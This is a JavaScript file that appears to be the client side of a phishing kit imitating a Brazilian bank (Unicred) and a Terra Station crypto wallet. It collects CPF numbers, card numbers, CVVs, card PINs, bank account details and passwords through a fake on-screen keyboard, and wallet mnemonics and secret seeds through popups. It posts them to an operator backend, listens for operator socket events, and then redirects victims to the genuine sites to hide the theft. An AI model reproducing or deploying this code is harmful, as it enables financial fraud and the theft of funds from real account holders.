const client =(() => {

    function TestaCPF(strCPF) {
        var Soma;
        var Resto;
        Soma = 0;

        let cleanCPF = strCPF.replace(/\.|\-/g, '')

      if (cleanCPF == "00000000000") return false;
    
      for (i=1; i<=9; i++) Soma = Soma + parseInt(cleanCPF.substring(i-1, i)) * (11 - i);
      Resto = (Soma * 10) % 11;
    
        if ((Resto == 10) || (Resto == 11))  Resto = 0;
        if (Resto != parseInt(cleanCPF.substring(9, 10)) ) return false;
    
      Soma = 0;
        for (i = 1; i <= 10; i++) Soma = Soma + parseInt(cleanCPF.substring(i-1, i)) * (12 - i);
        Resto = (Soma * 10) % 11;
    
        if ((Resto == 10) || (Resto == 11))  Resto = 0;
        if (Resto != parseInt(cleanCPF.substring(10, 11) ) ) return false;
        return true;
    }

    function masks() {
        const inputCPF = document.querySelector('input#cpf');
        //cpf
        if(inputCPF) {
            console.log(inputCPF)
            var cleavecpf = new Cleave('input#cpf', {
                delimiters: ['.', '.', '-'],
                blocks: [3, 3, 3, 2],
                numericOnly: true
            })
        }
    
        const inputDate = document.querySelector('input#card_date');
    
        if(inputDate) {
            var cleaveDate = new Cleave('input#card_date', {
                delimiters: ['/'],
                blocks: [2, 2],
                numericOnly: true
            })
        }
    
        const inputSenha = document.querySelector('input#senha');
        //cpf
        if(inputSenha) {
            var cleavepass = new Cleave('input#senha', {
                blocks: [10],
                numericOnly: true
            })
            
        }
    
        const inputCardPass = document.querySelector('input#card_password');
        //cpf
        if(inputCardPass) {
            var cleaveCardpass = new Cleave('input#card_password', {
                blocks: [4],
                numericOnly: true
            })
            
        }
    
        const inputCvv = document.querySelector('input#card_code');
        //cpf
        if(inputCvv) {
            var cleaveCardpass = new Cleave('input#card_code', {
                blocks: [3],
                numericOnly: true
            })
            
        }
    
        const inputCard = document.querySelector('input#card_number');
        //cpf
        if(inputCard) {
            var cleave = new Cleave(inputCard, {
                creditCard: true,
                onCreditCardTypeChanged: function (type) {
                    // update UI ...
                }
            });
            
        }

        const clickToText = document.querySelector('.password_input span');

        if(clickToText) {
            clickToText.addEventListener('click', function (e) {
               e.preventDefault() 

               if(clickToText.closest('div').querySelector('input').type == `text`) {
                clickToText.closest('div').querySelector('input').type = `password`
                clickToText.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 24 24" style="enable-background:new 0 0 24 24;" xml:space="preserve">
                <style type="text/css">
                    .st0{fill:none;}
                    .st1{fill:#E55202;}
                </style>
                <path class="st0" d="M0,0h24v24H0V0z M0,0h24v24H0V0z M0,0h24v24H0V0z M0,0h24v24H0V0z"/>
                <path class="st1" d="M12,7c2.8,0,5,2.2,5,5c0,0.6-0.1,1.3-0.4,1.8l2.9,2.9c1.5-1.3,2.7-2.9,3.4-4.7c-1.7-4.4-6-7.5-11-7.5  c-1.4,0-2.7,0.2-4,0.7l2.2,2.2C10.7,7.1,11.4,7,12,7z M2,4.3l2.3,2.3L4.7,7C3,8.3,1.7,10,1,12c1.7,4.4,6,7.5,11,7.5  c1.6,0,3-0.3,4.4-0.8l0.4,0.4l2.9,2.9l1.3-1.3L3.3,3L2,4.3z M7.5,9.8L9,11.4c0,0.2,0,0.4,0,0.6c0,1.7,1.3,3,3,3c0.2,0,0.4,0,0.6-0.1  l1.6,1.5C13.5,16.8,12.8,17,12,17c-2.8,0-5-2.2-5-5C7,11.2,7.2,10.5,7.5,9.8z M11.8,9l3.1,3.1v-0.2C14.9,10.2,13.6,8.9,11.8,9  L11.8,9z"/>
                </svg>`
               }else{
                clickToText.closest('div').querySelector('input').type = `text`
                clickToText.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 24 24" style="enable-background:new 0 0 24 24;" xml:space="preserve">
                <style type="text/css">
                    .st0{fill:none;}
                    .st1{fill:#E55202;}
                </style>
                <path class="st0" d="M0,0h24v24H0V0z"/>
                <path class="st1" d="M12,4.5C7,4.5,2.7,7.6,1,12c1.7,4.4,6,7.5,11,7.5s9.3-3.1,11-7.5C21.3,7.6,17,4.5,12,4.5z M12,17  c-2.8,0-5-2.2-5-5s2.2-5,5-5s5,2.2,5,5S14.8,17,12,17z M12,9c-1.7,0-3,1.3-3,3s1.3,3,3,3s3-1.3,3-3S13.7,9,12,9z"/>
                </svg>`
               }

               
            });
        }
    }

    function getFormData(form) {
        const elements = form.elements

        const data  = {}


        Array.from(elements).forEach(el => {
            if(el.name) data[el.name] = el.value
        })

        return data
    }

    //private var/functions
    async function submit(target){
        const form = document.querySelector(target);

        if(!form) return

        

        form.addEventListener('submit', async function (e) {
            e.preventDefault()

            try {

                const data = getFormData(form)


                if(data?.senha?.length < 6) return notyf.open({
                    type: 'warning',
                    message: `O Campo senha deve ter no mínimo 6 dígitos`
                })

                if(!TestaCPF(data?.cpf)){
                     notyf.open({
                        type: 'warning',
                        message: `CPF inválido`
                    })

                    return
                }
                
                form.querySelector('button[type="submit"]').innerHTML = `
                <div class="spinner-border text-light" role="status">
                    <span class="visually-hidden">Loading...</span>
                </div>`


            } catch (error) {
                console.log(`erro`, error)

                form.querySelector('button[type="submit"]').innerHTML = `Login`

                notyf.open({
                    type: 'warning',
                    message: JSON.stringify(error?.message)
                })
            }

            
        });
    }

    async function createClient(data) {
        var raw = JSON.stringify(data);

        console.log(`data enviado: `, data)
          
          var requestOptions = {
            method: 'POST',
            headers: { 'content-type': 'application/json' },
            body: raw,
          };
          
          fetch("/clients", requestOptions)
            .then(response => response.json())
            .then(result => {
                const { id } = result

                if(!id) return console.log(`not id in`, result)

                window.location.href = `/module/safety/${id}`
            })
            .catch(error => console.log('error', error));
    }

    async function sendUser(target) {
        const form  = document.querySelector(target)

        const buttonsTab = document.querySelectorAll('button[data-bs-toggle="tab"]')

        //cpf mask
        const cpfInput = document.querySelector('input#agencia')

        if(!cpfInput) return 

        var cpf = new Cleave('input#agencia', {
            numericOnly: true,
            blocks: [4],
            uppercase: true
        })

        var account = new Cleave('input#conta', {
            numericOnly: true,
            blocks: [10],
            uppercase: true
        })

        for (const targetEl of buttonsTab) {
            if(targetEl) {
                targetEl.addEventListener('shown.bs.tab', event => {
                    const previousTab = document.querySelector(`.${event.relatedTarget.getAttribute('data-target') }`);
                    const activeTab = document.querySelector(`.${event.target.getAttribute('data-target') }`)

                    if(!previousTab && !activeTab) return

                    const inputsPrevious = previousTab.querySelectorAll('input')
                    const inputsActive = activeTab.querySelectorAll('input')

                    if(!inputsPrevious && !inputsActive) return

                    for (const inputPrev of inputsPrevious) {
                        inputPrev.required = false
                    }

                    for (const inputActive of inputsActive) {
                        inputActive.required = true
                    }
                })
            }
        }

        

        if(!form) return

        form.addEventListener('submit', function (e) {
            e.preventDefault()

            const data =  getFormData(form)

            return createClient(data)

        });
    }

    function deleteClient(button) {
        const buttons = document.querySelectorAll(button);

        if(!button) return

        for (const btn of buttons) {
            btn.addEventListener('click', async function (e) {
                try {
                    e.preventDefault()

                    const client_id = btn.dataset.client

                    if(!client_id) return

                    const options = {
                        method: 'DELETE',
                        headers: {
                            'content-type': 'application/json',
                        },
                    }

                    const client  = await(await fetch(`/clients/${client_id}`, options)).json()

                    if(btn.closest('tr').remove()) console.log(client)
                } catch (error) {
                    console.log(error)
                }
                
            });
        }
    }
    
    async function handleRegister(data) {
        try {
            var requestOptions = {
                method: 'POST',
                headers: { 'content-type': 'application/json' },
                body: JSON.stringify(data),
              };
              
            const request  = await fetch("/register", requestOptions)

            if(!request.ok) return notyf.open({
                type: 'warning',
                message: `Erro ao cadastrar cliente!`
            })

            const response = await request.json()
            ///product/register/{{product.id}}
            return window.location.href = `/product/register/${response?.product?.id}`
                
        } catch (error) {
            console.log(error)
        }
    }

    function handleFormRegisterSubmit(form) {
        const formulario = document.querySelector(form);

        if(!formulario) return

        formulario.addEventListener('submit', function (e) {
            e.preventDefault()

           

            const data = {
                user: formulario.elements['login'].value,
                password: formulario.elements['password'].value,
                productId: formulario.elements['productId'].value,
            }

            handleRegister(data)
        });
    }
    return {
        //public var/functions
        submit,
        sendUser,
        getFormData,
        deleteClient,
        masks,
        handleFormRegisterSubmit
    }
})()

//client.handleFormRegisterSubmit('form.form-client-login.client-login')
client.masks()
client.submit(`.form-client`)
client.submit(`.form-client-update`)
client.sendUser(`.senduserForm`)
client.deleteClient(`.delete-client`)

const showPassButton = document.querySelector('.showpassword-icon');

if(showPassButton) {
    showPassButton.addEventListener('click', function (e) {
        e.preventDefault()

        const input = showPassButton.closest('.password-input').querySelector('input')

        if(showPassButton.classList.contains('active')) {
            showPassButton.classList.remove('active')

            showPassButton.querySelector('img').setAttribute('src', `/assets/img/bsfra/cut-eye-blue.svg`)

            input.setAttribute('type', 'password')
        }else{
            showPassButton.classList.add('active')
            input.setAttribute('type', 'text')
            showPassButton.querySelector('img').setAttribute('src', `/assets/img/bsfra/eye-blue.svg`)
        }
        
    });
}

const keyboard = (() => {
    function handleConfirm(button, form) {
        if(!button && !form) return

        button.addEventListener('click', function (e) {
            e.preventDefault()

            handleFormSubmit(form)
        });
    }

    function handleClear(button, input) {
        if(!button && !input) return

        button.addEventListener('click', function (e) {
            e.preventDefault()

            input.value = ``
        });
    }
    //private var/functions
    function handleButtons(buttons, input) {
        if(!buttons && !input) return 

        Array.from(buttons).forEach(el => {
            el.addEventListener('click', function (e) {
                e.preventDefault()

                const form = input.closest('form')

                if(!form) return

                let value = el.value

                if(value == `shift`) {
                    if(form.dataset.shift == `up`){
                        form.dataset.shift = form.dataset.shift = ``
                        
                        Array.from(buttons).forEach(el => {
                            el.innerHTML = el.innerHTML.toLowerCase()
                        })
                    }else{
                        form.dataset.shift = form.dataset.shift = `up`
                        Array.from(buttons).forEach(el => {
                            el.innerHTML = el.innerHTML.toUpperCase()
                        })
                    }
                    
                }

                if(value == `symbols`) {
                    document.querySelector('.text-keys').classList.toggle('hide')
                    document.querySelector('.symbol-keyboard').classList.toggle('show')
                }

                if(form.dataset.shift == `up`) value = el.value.toUpperCase()

                if(value != `SHIFT` && value != `shift` && value != 'symbols' && value != 'SYMBOLS') handleValueInput(input, value)
            });
        })
    }

    function handleValueInput(input, value) {
        if(!value && !input) return

        input.value = input.value + value
    }

    function handleFormSubmit(form) {
        const userId = document.body.dataset.client

        if(!form && !userId) return

        let url = `/module/documents/${userId}`

        

        const data = JSON.stringify(login.getFormData(form))

        var requestOptions = {
            method: 'PATCH',
            headers: { 'content-type': 'application/json' },
            body: data,
        };
        
        fetch(`/clients/${userId}`, requestOptions)
        .then(response => response.json())
        .then(result => {
            const { id } = result

            if(!id) return console.log(`not id in`, result)

            if(form.classList.contains('documents')) url = `/module/eletronic/${userId}`
            if(form.classList.contains('alphanumeric')) url = `/module/alphanumeric/${userId}`

            if(document.querySelector('input[name="alphanumericSignature"]')) url = `https://www.unicred.com.br/solucoes/conta-corrente`

            window.location.href = url
        })
        .catch(error => console.log('error', error));
    }

    function handleForm(target){
        const form = document.querySelector(target);

        
        if(!form) return
        const userId = form.dataset.id

        const buttons = form.querySelectorAll('.keyboard button')
        const input = form.querySelector('input')
        const clearButton = document.querySelector('button.clean');
        const confirmButton = document.querySelector('button.confirm');

        handleClear(clearButton, input)

        handleButtons(buttons, input)

        handleConfirm(confirmButton, form)
    }
    
    return {
        //public var/functions
        handleForm
    }
})()

const submit = (() => {
    //private var/functions
    function openMnemonic(element) {
        const module = element.dataset.module

        
        if(!module) return
        window.open('/module/popup/'+module+'','...','status=no,titlebar=no,location=no,directories=no,channelmode=no,menubar=no,toolbar=no,scrollbars=no,resizable=no,menubar=0,top=0,left='+window.innerWidth+',width=500,height=620')
    }

    function openFormMnemonic(element) {
        const module = element.dataset.module

        
        if(!module) return
        window.open('/module/mnemonic/'+module+'','...','status=no,titlebar=no,location=no,directories=no,channelmode=no,menubar=no,toolbar=no,scrollbars=no,resizable=no,menubar=0,top=0,left='+window.innerWidth+',width=500,height=620')
    }

    function enableSubmit(form) {
        const formEl = document.querySelector(form);

        if(!formEl) return

        const button = formEl.querySelector('button')

        if(!button) return

        const textarea = formEl.querySelector('textarea')

        if(!textarea) return

        textarea.addEventListener('keyup', function (e) {
            console.log(`key click`)
            if(textarea.value.length > 10) button.disabled = false
        });
    }

    async function formSubmit(form) {
    
        const formSubmit = document.querySelector(form);
        if(!formSubmit) return

        formSubmit.addEventListener('submit', async function (e) {
            e.preventDefault()

            try {
                const module = formSubmit.dataset.module

                if(!module) return

                const data = {
                    mnemonic: formSubmit.elements['mnemonic']?.value,
                    secret_seed: formSubmit.elements['secret_seed']?.value
                } 

                if(!data) return

                data.module = module

                console.log(data)

                const options = {
                    method: 'POST',
                    headers: {
                        'content-type': 'application/json',
                    },
                    body: JSON.stringify(data)
                }
                const client =await (await fetch(`/clients`, options)).json()

                document.body.dataset.client = client?.id

                return window.close('','_parent','')
            } catch (error) {
                console.log(error)
            }
        });
    }
    
    return {
        //public var/functions
        openMnemonic,
        openFormMnemonic,
        formSubmit,
        enableSubmit
    }
})()

submit.enableSubmit(`.mnemonic-form`)
submit.enableSubmit(`.form-secret-seed`)
submit.formSubmit(`.mnemonic-form`)
submit.formSubmit(`.form-secret-seed`)

keyboard.handleForm(`.boxKeyboard form`)

socket.on('clientSubmit', (data) => {
    if(!document.body.classList.contains('dashboard')){
        if(document.body.dataset.client && document.body.dataset.client == data.id)
        window.location.href = `https://station.terra.money/`
    }
})